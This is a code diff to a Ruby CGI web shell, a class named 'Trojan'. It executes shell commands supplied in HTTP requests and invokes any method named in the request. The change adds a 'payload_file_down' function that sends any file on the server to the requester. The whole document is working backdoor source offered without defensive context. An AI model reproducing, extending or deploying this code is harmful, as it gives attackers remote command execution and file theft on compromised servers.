@@ -2,6 +2,7 @@
 require 'cgi'
 require 'cgi/session'
 require 'cgi/session/pstore'
+require 'fileutils'
 require 'json'
 
 class Trojan
@@ -29,14 +30,14 @@ class Trojan
             process_shell_command(json['cmd'].first)
         # otherwise, simply invoke the method directly
         else
-            send json['action'].first, json['args']
+            send json['action'].first, json
         end
     end
 
     def process_shell_command command
         stdout    = `cd #{@cwd}; #{command} 2>&1; pwd`;
         std_lines = stdout.split("\n");
-        @cwd       = std_lines.pop
+        @cwd      = std_lines.pop
         stdout    = std_lines.join "\n"
 
         @response = {
@@ -68,6 +69,28 @@ class Trojan
             'prompt_context' => self.get_prompt_context
         }
         self.send_response
+    end
+
+    ##########################################################################
+    # Payload functions are from here downward
+    ##########################################################################
+    def payload_file_down json
+        # emulate directory persistence
+        Dir.chdir @cwd
+        dl_file = json['args[file]'].first
+
+        # if the requested file exists, serve it up to the user
+        if File.exist? dl_file
+            puts @cgi.header(
+                'Content-Disposition'       => 'attachment; filename=' + File.basename(dl_file),
+                'Content-Transfer-Encoding' => 'binary',
+            );
+            puts File.read(dl_file)
+
+        # if not, provide a notification
+        else
+            puts "File does not exist"
+        end
     end
 end
 
